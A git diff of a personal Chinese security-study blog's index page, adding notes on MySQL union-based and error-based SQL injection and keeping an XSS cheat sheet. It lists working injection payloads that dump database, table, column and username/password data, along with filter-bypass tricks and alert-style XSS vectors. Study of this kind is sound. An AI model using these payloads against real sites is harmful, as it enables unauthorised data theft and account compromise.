@@ -91,6 +91,7 @@
 <meta property="og:title" content="TobeFine">
 <meta property="og:url" content="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/index.html">
 <meta property="og:site_name" content="TobeFine">
+<meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TobeFine">
 
@@ -293,7 +294,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/05/27/XSS总结/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/27/union回显_报错注入/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -318,8 +319,8 @@
             
               
                 
-                <a class="post-title-link" href="/2017/05/27/XSS总结/" itemprop="url">
-                  xss总结
+                <a class="post-title-link" href="/2017/11/27/union回显_报错注入/" itemprop="url">
+                  SQL总结(一)_Union回显+报错注入
                 </a>
               
             
@@ -335,8 +336,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-27T16:19:08+08:00">
-                2017-05-27
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-27T01:02:03+08:00">
+                2017-11-27
               </time>
             
 
@@ -354,8 +355,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/05/27/XSS总结/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/05/27/XSS总结/" itemprop="commentCount"></span>
+                <a href="/2017/11/27/union回显_报错注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/27/union回显_报错注入/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -383,252 +384,62 @@
       
         
           
-            <p>1.常用XSS注入标签</p>
-<pre><code>`&lt;img onerror=&quot;alert(document.domain)&quot; src=&gt;
+            <p></p><h4>MYSQL的爆数据顺序：</h4><p></p>
+<p>&gt;1.show databases;（一个MYSQL中有多少个数据库）<br><br>     use xxx（其中一个数据库）<br><br></p><p>&gt;2.show tables; (xxx这个数据库中所有的表)<br>     select * from xxa（xxa为xxx数据库中的一个表）<br><br></p><p>&gt;3.查看表中的所有信息[包括多少列（每行不同的属性 id、username等属性）、多少行（多少条数据）]<br><br><br></p><h4>注入类型的判断:</h4><br><p>&gt;1.字符型SQL注入：<br><br>SQL语句执行的过程中被单引号，或者双引号，或者括号等包起来，其实就是在SQL语句执行的过程中，这个id参数被当做是字符类型的数据来进行处理。<br><br></p><p>&gt;2.数字型SQL注入：<br><br>没有’’等包起来<br>在平台的注入中，单单用’来确定有没有注入点是不对的，因为不同的平台使用的查询语句都不相同，所以各种符号都要进行尝试。<br><br>##<br><br><br>## 1.确认是否有注入点 ##<br><pre>          1&gt;’报错<br>    2&gt;id=1 and 1=1 正常<br>    3&gt;id=1 and 1=2 报错<br></pre><br><br>## 2.寻找注入点 ##<br><pre> 1&gt;确认要爆的表有多少列<br>     id=1’ order by %d  –+正常则有，报错则没有该字段了(一般为3）<br>     order by 即有多少列名（属性：id、username等）<br><br>  2&gt;确认有没有过滤特殊字符<br>     id=1’union select 1 from 1 where 1=1 若报错，那么union select from where 中有被过滤的元素（可能不止一个）<br><br>  3&gt;绕过过滤<br>     a.用ASCII码的非打印字符绕过关键字的过滤（例如：%0c、%0b）<br>     b.用大小字母作转换（例如：union -&gt; uniOn）<br>     c.若为全过滤，进行重复过滤（例如：union -&gt; uniUNIONon）<br>     d.其中一个字母换位ASCII码 （例如：from -&gt; f&#114;om）<br>     e.逗号可以用join代替 空格可以用%0a 双引号可用16进制转换<br><br>  4&gt;爆数据库<br>        4.1&gt;id=1’union select 1,schema_name,3 from information_schema.schemata limit 1,2 –<br>    4.2&gt;?id=0’ union select 1,2,3 –+ //看看爆1,2,3哪一个在屏幕中有回显..在有的那个那里，替换为database() version()等都可以爆出相应想要的东西<br><br>     limit 0,1 -&gt; 得到前1条信息（得到第1行信息）<br>     limit 0,2 -&gt; 得到前2条信息<br>     limit 1,2 -&gt; 得到第2行信息<br>     limit 2,3 -&gt; 得到第3行信息<br><br>     union select 1,2,3<br>    （有三列，第一列一般为id<br>     第二列一般为username，第三列一般为passwd等）<br><br>     获取第二列中的信息（也就是库表的名字）-&gt; schema_name<br>     limit 0,1 -&gt; 第一个数据库<br>     limit 1,2 -&gt; 第二个数据库<br>     limit 2,3 -&gt; 第三个数据库<br><br> 5&gt;爆数据表<br><br>     id=1’ union select 1,table_name,3 from information_schema = (select database()) limit 0,1 –+<br><br>     ?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’当前数据库’ –+<br><br><br>     不止一个表的时候，要用group_concat（）<br>     infromation_schema = (select database()) //use database(xxx) (选择的数据库)<br>     table_name  就是所选择的数据库（select database()）中所有表的名字<br>     limit 0,1就是选择第一个表（一次类推）<br><br><br>6&gt;爆数据（字段名）<br><br>     id=1’ union select 1,column_name,3 from information_schema.columns where table_schema=(select database()) limit 0,1<br><br>     id=0’union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’当前数据库’and table_name=’当前表名’ –+<br><br><br>    可以不使用limit 0，1 (一行一行的发现数据库、数据表、数据）<br>    使用group_concat (一次性爆出所有的数据库和数据表)<br><br>    &gt;6.1爆数据表<br><br>     ?id=1’ union select 1,group_concat(table_name),3 from infromation_schema.tables where table_schema=’数据库名字’ –+<br><br>     (分号用于闭合前面的’）<br><br>    &gt;6.2爆数据<br><br>     ?id=1’ union select 1,group_concat(username),group_concat(password) from 数据表 –+<br><br>     group_concat() 计算那些行属于同一组，列出来<br><br><br></pre><br><br>## 3.基于错误 ##<br></p><p><br>  1.基于id的错误来爆出信息<br></p>
 
-&lt;a href = javascript:alert(document.domain)&gt;
+<pre><code>id=&apos;负数&apos; union select 5,version(),3 and  1
 
-&lt;script&gt;alert(document.domain)&lt;/script&gt;
+id一定要为负，如果为正，那么login会查询到数据表中相应数字的数据
 
-javascript:alert(document.domain)
+union select 后面的数字可以随意..
 
-onclick = alert(document.domain)
+and 1(数字型）、and &amp;lsquo;1(单引号）来代替#、+等注释符号
 
-onmouseover = alert(document.domain) /onfocus
-
-&lt;svg/onload = alert(document.domain)&gt;`
-</code></pre><p>2.过滤字符常见的处理方法：<br>a.中间再插入1个相同的字符<br>[例如：<br>     <code>1.过滤了script → scrSCRIPTipt</code><br>]</p>
-<p>b.改换大小写<br>[例如：<br>     <code>1.过滤了script → scriPt</code><br>]</p>
-<p>c.将其中一个数字改成Unicode编码<br>[例如:<br>    <code>1.过滤script → sc&amp;#114;ipt</code><br>]</p>
-<p>d.加注释符绕过<br>[例如：<br>    <code>1.expression → expre/**/ssion</code><br>]</p>
-<p>e.转换为16进制编码<br>[例如：<br>    <code>1.script → sc%52ipt</code><br>]</p>
-<p>f:全部转换为Unicode编码<br>[例如：<br>     1.过滤了alert<br> <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
- http://tool.chinaz.com/tools/unicode.aspx
- &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,10))&lt;/script&gt;</code><br>]</p>
-<p>4.常见的xss注入点<br>     通过GET方法：（在URL中输入的参数显示在HTML中）<br>a.在<code>&lt;b&gt;</code>或者<code>&lt;p&gt;</code>中</p>
-<pre><code>`&lt;img onerror=&quot;alert(document.domain);&quot; src=&gt;
-
- &lt;script&gt;alert(document.domain)&lt;/script&gt;
-
- &lt;a href=javascript:alert(document.domain)&gt;`
-</code></pre><p>b.在<code>&lt;input&gt;</code>标签里面<br>     ①逃出&lt; &gt;<br>    例如:</p>
-<pre><code>原句：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;
-变为：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;&lt;img onerror=&quot;alert(document.domain);&quot;src=&gt;&quot; type=&quot;text&quot;&gt;
-</code></pre><p> ②如果无法逃出value=””里的双引号<br>     a.查看是否有hidden标签，如有：<br><br>          a1.看看在url中可不可以用GET方法修改hidden 标签的值<br>          a2:用burp抓包，再修改值<br><br>     b.利用特殊符号吃掉双引号（%A7） 宽字节注入<br><br>     c.使用onclick onmouseover onfocus<br><br>③有字数限制<br>      用burp修改<br><br>④转义了&lt;&gt;<br>      可以用onclick在input中触发，使用onclick onmouseover</p>
-<p>c.类似于评论区的，可以提交自己的信息的<br><br> ①若没有过滤<img标签><br><br> 在<img>标签中插入onload事件，（自己创建一个可以放入xss的地方）  </img标签></p>
-<pre><code>&lt;img src=&quot;&quot; onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;
-</code></pre><p>d.若页面转换照片通过url后面的参数来转换</p>
-<p>e.使用了字母大小写的转换：<br></p>
+id==&apos;负数&apos; union select 2,current_user,3 and &amp;lsquo;1
+</code></pre><p></p><p><br>  2.使用大量错误信息获取数据<br></p><p></p>
 <blockquote>
-<ul>
-<li>toLocaleUpperCase 将字符串中所有的字母字符都将被转换为大写的，同时适应宿主环境的当前区域设置。</li>
-</ul>
-<ul>
-<li>toUpperCase 将字符串中的所有字母都被转化为大写字母。</li>
-</ul>
-<ul>
-<li>toLocaleLowerCase 将字符串所有的字母字符都被转换为小写，同时考虑到宿主环境的当前区域设置。</li>
-</ul>
-<ul>
-<li>toLowerCase 将字符串中的字母被转换为小写字母。</li>
-</ul>
+<p>1.select database() //显示当前数据库<br></p>
 </blockquote>
-<p>toUpperCase():<br><br> ı ==&gt;I<br><br> ſ ==&gt;S<br></p>
-<p> toLowerCase():<br><br> İ ==&gt;i<br><br> K ==&gt;k<br></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/03/04/python爬虫的一些小知识点/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="Shirley">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/myslef.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="TobeFine">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="TobeFine" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/03/04/python爬虫的一些小知识点/" itemprop="url">
-                  python爬虫的一些小知识点
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-04T14:32:45+08:00">
-                2017-03-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/03/04/python爬虫的一些小知识点/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/04/python爬虫的一些小知识点/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>-</p>
-<blockquote>
-<p><strong>关于cookielib</strong></p>
-</blockquote>
-<p>1&gt;cookie:有一些网站在cookie未启用的时候无法浏览，而cookie是用于某些网站辨别用户身份，进行session跟踪而存储在 用户本地终端 上的数据（比如说有些网站需要登录后才能访问某个页面，在登录之前，你想抓取某个页面内容是不允许的。那么我们可以利用Urllib2库保存我们登录的Cookie，然后再抓取其他页面就达到目的了。）</p>
-<p> 2&gt;打开网页的console，刷新页面之后，在network中会有Request Headers，其中就有cookie</p>
-<p>当我们(客户端）输入URL请求页面后，我们即给web服务端发送了一个要求（request），web server根据Request生产响应的response，发回给我们（客户端），然后解析Response的html，我们就可以看到页面</p>
-<p> –当网站发送页面到客户端时（服务器发送给客户端），会发送Headers来描述HTTP事物，送回来的headers（response headers）中包含一些有cookie的文本。如果此时想要从相同的服务器返回其他页面（客户端请求其他页面），那么cookie就必须作为请求的handler（request handler）传送给服务器，这就意味着cookies会存储一些信息让服务器来识别你。</p>
-<pre><code>#其中一种获取网页的方式#
-cj =cookielib.CookieJar()
-opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-urllib2.install_opener(opener)
-response3 = urllib2.urlopen(url)
-print response3.getcode()
-print cj
-print response3.read()
+<pre><code>select count(*) from information_schema.tables;//一共有多少行(例如显示数据为：203）
 </code></pre><blockquote>
-<p><strong>关于CookieJar()</strong></p>
+<p>2.select concat(0x3a,0x3a,(select database()),0x3a,0x3a)//查询当前数据库联结输出（::数据库::） 0x3a在表中体现为空 通过分号分隔开</p>
+<p>3.select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a //a为输出的联结（::数据库::）</p>
+<p>4.选择当前的数据库来添加多个表的联结输出</p>
 </blockquote>
-<p>cookielib.CookieJar用于存储cookie对象，此模块捕获cookie并在后续连接请教时重新发送，还可以用来处理包含cookie数据文件</p>
+<pre><code> select concat(0x3a,0x3a(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables; 
+（对应1中的每一行对应一个输出联结）
+</code></pre><blockquote>
+<p>5.选择当前的数据库来添加多个数据的联结输出</p>
+</blockquote>
+<pre><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
+</code></pre><p>  多试几次，当随机数字重复的时候，会得到错误信息，错误信息会有返回值，返回值中可以看到数据库的名字被显示出来</p>
+<p></p><p><br>  3.爆表<br></p><p></p>
 <blockquote>
-<p><strong>关于opener和handlers</strong></p>
+<p>1.爆库名</p>
 </blockquote>
-<p>1&gt;opener:当你获取一个URL的时候，你就使用一个opener(一个urllib2.OpenerDirector的实例) 默认的opener也就是我们常用的urlopen。它是一个特殊的opener，传入的参数仅仅是url,data,timeout(可以注意到并没有cookie，说明在某些网页中无法使用这种方法抓取数据），如果我们需要用到cookie，就需要创建更一般的opener来实现对Cookie的设置</p>
-<p>-<br><strong>自定义opener</strong></p>
-<pre><code>#使用build_opener()
-opener = urllib2.build_opener([handler1[handler2...]])
-</code></pre><p>参数handler是Handler实例，常用的有HTTPBasicAuthHandler、HTTPCookieProcessor、ProxyHandler等</p>
-<p>①<strong>修改http报头</strong></p>
-<pre><code>import urllib2
-opener = urllib2.build_opener()
-opener.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0&apos;)]
-opener.open(url)
-</code></pre><p>②<strong>install_opener(opener)</strong><br>安装不同的opener对象作为urlopen()使用的全局opener</p>
-<pre><code>opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-urllib2.install_opener(opener)
-response3 = urllib2.urlopen(url)
-</code></pre><p>③<strong>密码验证（HTTPBasicAuthHandler</strong>）<br>HTTPBasicAuthHandler()处理程序可用add_password()来设置密码。</p>
-<pre><code>h.add_password(远程关联的名称,基URL,user,passwd)
-</code></pre><p>-</p>
-<pre><code>import urllib2
-auth=urllib2.HTTPBasicAuthHandler()
-auth.add_password(&apos;Administrator&apos;,&apos;http://www.example.com&apos;,&apos;Dave&apos;,&apos;123456&apos;)
-opener=urllib2.build_opener(auth)
-u=opener.open(URL)
-</code></pre><p>④<strong>Cookie处理(HTTPCookieProcessor)</strong></p>
-<pre><code>import urllib2,cookielib
-cookie=cookielib.CookieJar()
-cookiehand=urllib2.HTTPCookieProcessor(cookie)
-opener=urllib2.build_opener(cookiehand)
-</code></pre><p>⑤<strong>代理(ProxyHandler)-</strong><br>ProxyHandler(proxies)参数proxies是一个字典，将协议名称（http，ftp）等映射到相应代理服务器的URL。</p>
-<pre><code>proxy=ProxyHandler({&apos;http&apos;:&apos;http://someproxy.com:8080&apos;})
-auth=HTTPBasicAuthHandler()
-auth.add_password()
-opener=build_opener(auth,proxy)
-</code></pre><p>-</p>
-<hr>
-<p><strong>实例爬虫</strong></p>
-<blockquote>
-<p>1.确定抓取的目标：<br>-通过网页”检查元素”的操作可以确定该网页的url格式，数据格式和网页编码</p>
-<p>2.分析目标</p>
-<p>3.编写代码<br>在一个包中写入：总程序调度文件、URL管理器文件、HTML下载器文件、HTML解析器文件、HTML输出器文件</p>
+<pre><code>select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
+</code></pre><blockquote>
+<p>2.爆版本名</p>
 </blockquote>
+<pre><code>select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;   
+</code></pre><blockquote>
+<p>3.</p>
+</blockquote>
+<pre><code>第一步
+1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)#
 
+第二步
+1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a))#
+
+第三步
+1&apos;) and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b)#
+</code></pre><blockquote>
+<p>4.除了floor()函数外，还有updatexml()、extractvalue()也有同样的功能<br>updatexml()</p>
+</blockquote>
+<pre><code>1&apos;) and (updatexml(1,concat(0x3a,0x3a,(select database()),0x3a,0x3a),1))#
+
+1&apos;) and (extractvalue(1,concat(0x3a,0x3a,(select database()),0x3a,0x3a)))#
+</code></pre>
           
         
       
@@ -668,7 +479,7 @@ opener=build_opener(auth,proxy)
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/15/xss试验/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/xss试验/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -693,7 +504,7 @@ opener=build_opener(auth,proxy)
             
               
                 
-                <a class="post-title-link" href="/2017/02/15/xss试验/" itemprop="url">
+                <a class="post-title-link" href="/2017/11/26/xss试验/" itemprop="url">
                   xss攻击类型和方式
                 </a>
               
@@ -710,8 +521,8 @@ opener=build_opener(auth,proxy)
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-15T13:30:40+08:00">
-                2017-02-15
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
+                2017-11-26
               </time>
             
 
@@ -729,8 +540,8 @@ opener=build_opener(auth,proxy)
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/02/15/xss试验/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/15/xss试验/" itemprop="commentCount"></span>
+                <a href="/2017/11/26/xss试验/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/xss试验/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -874,7 +685,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/14/xss注入基本知识/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/xss注入基本知识/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -899,7 +710,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
             
               
                 
-                <a class="post-title-link" href="/2017/02/14/xss注入基本知识/" itemprop="url">
+                <a class="post-title-link" href="/2017/11/26/xss注入基本知识/" itemprop="url">
                   xss注入的基础知识
                 </a>
               
@@ -916,8 +727,8 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-14T22:18:15+08:00">
-                2017-02-14
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
+                2017-11-26
               </time>
             
 
@@ -935,8 +746,8 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/02/14/xss注入基本知识/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/14/xss注入基本知识/" itemprop="commentCount"></span>
+                <a href="/2017/11/26/xss注入基本知识/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/xss注入基本知识/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -988,7 +799,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
 </code></pre><p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
 <pre><code>DOM-based XSS
 </code></pre><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击。<br>注：domxss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的。dom-based与非dom-based，反射和存储是两个不同的分类标准。</p>
-<p> <strong>转载自<a href="http://www.imooc.com/m/wap/article/detail.html?aid=13553" target="_blank" rel="external">http://www.imooc.com/m/wap/article/detail.html?aid=13553</a> 对于跨站脚本攻击（XSS攻击）的理解和总结</strong> </p>
+<p> <strong>转载自<a href="http://www.imooc.com/m/wap/article/detail.html?aid=13553" target="_blank" rel="noopener">http://www.imooc.com/m/wap/article/detail.html?aid=13553</a> 对于跨站脚本攻击（XSS攻击）的理解和总结</strong> </p>
 
           
         
@@ -1029,7 +840,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/02/12/hello-world/">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/XSS总结/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="Shirley">
@@ -1054,8 +865,8 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
             
               
                 
-                <a class="post-title-link" href="/2017/02/12/hello-world/" itemprop="url">
-                  Hello World
+                <a class="post-title-link" href="/2017/11/26/XSS总结/" itemprop="url">
+                  xss总结
                 </a>
               
             
@@ -1071,8 +882,8 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-12T21:48:21+08:00">
-                2017-02-12
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
+                2017-11-26
               </time>
             
 
@@ -1090,8 +901,8 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/02/12/hello-world/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/12/hello-world/" itemprop="commentCount"></span>
+                <a href="/2017/11/26/XSS总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/XSS总结/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -1119,15 +930,390 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+            <p>1.常用XSS注入标签</p>
+<pre><code>`&lt;img onerror=&quot;alert(document.domain)&quot; src=&gt;
+
+&lt;a href = javascript:alert(document.domain)&gt;
+
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+javascript:alert(document.domain)
+
+onclick = alert(document.domain)
+
+onmouseover = alert(document.domain) /onfocus
+
+&lt;svg/onload = alert(document.domain)&gt;`
+</code></pre><p>2.过滤字符常见的处理方法：<br>a.中间再插入1个相同的字符<br>[例如：<br>     <code>1.过滤了script → scrSCRIPTipt</code><br>]</p>
+<p>b.改换大小写<br>[例如：<br>     <code>1.过滤了script → scriPt</code><br>]</p>
+<p>c.将其中一个数字改成Unicode编码<br>[例如:<br>    <code>1.过滤script → sc&amp;#114;ipt</code><br>]</p>
+<p>d.加注释符绕过<br>[例如：<br>    <code>1.expression → expre/**/ssion</code><br>]</p>
+<p>e.转换为16进制编码<br>[例如：<br>    <code>1.script → sc%52ipt</code><br>]</p>
+<p>f:全部转换为Unicode编码<br>[例如：<br>     1.过滤了alert<br> <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+ http://tool.chinaz.com/tools/unicode.aspx
+ &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,10))&lt;/script&gt;</code><br>]</p>
+<p>4.常见的xss注入点<br>     通过GET方法：（在URL中输入的参数显示在HTML中）<br>a.在<code>&lt;b&gt;</code>或者<code>&lt;p&gt;</code>中</p>
+<pre><code>`&lt;img onerror=&quot;alert(document.domain);&quot; src=&gt;
+
+ &lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+ &lt;a href=javascript:alert(document.domain)&gt;`
+</code></pre><p>b.在<code>&lt;input&gt;</code>标签里面<br>     ①逃出&lt; &gt;<br>    例如:</p>
+<pre><code>原句：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;
+变为：&lt;input name=&quot;t1&quot; value=&quot;&quot; type=&quot;text&quot;&gt;&lt;img onerror=&quot;alert(document.domain);&quot;src=&gt;&quot; type=&quot;text&quot;&gt;
+</code></pre><p> ②如果无法逃出value=””里的双引号<br>     a.查看是否有hidden标签，如有：<br><br>          a1.看看在url中可不可以用GET方法修改hidden 标签的值<br>          a2:用burp抓包，再修改值<br><br>     b.利用特殊符号吃掉双引号（%A7） 宽字节注入<br><br>     c.使用onclick onmouseover onfocus<br><br>③有字数限制<br>      用burp修改<br><br>④转义了&lt;&gt;<br>      可以用onclick在input中触发，使用onclick onmouseover</p>
